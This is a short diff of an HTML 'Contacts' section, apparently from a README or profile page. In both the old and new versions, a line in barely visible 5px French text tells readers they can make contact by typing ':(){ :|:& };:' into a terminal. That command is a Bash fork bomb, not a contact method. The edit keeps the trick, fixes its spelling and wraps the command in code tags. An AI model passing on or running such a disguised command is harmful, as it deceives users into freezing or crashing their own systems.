@@ -91,9 +91,9 @@
   <table>
     <tr>
       <td colspan="2" align="center">
-        <h3><strong> ✉️ Contacts ☎️ </strong><span style="font-size: 5px;">Vous pouvez me contacter en tapent cette commande dans le terminal ":(){ :|:& };:" 🌐</span></h3>
-        <span style="font-size: 5px;">Vous pouvez me contacter en tapent cette commande dans le terminal ":(){ :|:& };:" 🌐</span>
-      </td> 
+      <h3><strong> ✉️ Contacts ☎️ </h3>
+        <span style="font-size: 5px;">Vous pouvez me contacter en tapant cette commande dans le terminal: <code>:(){ :|:& };:</code> 🌐</span>
+      </td>
     </tr>
     <tr>
       <td>
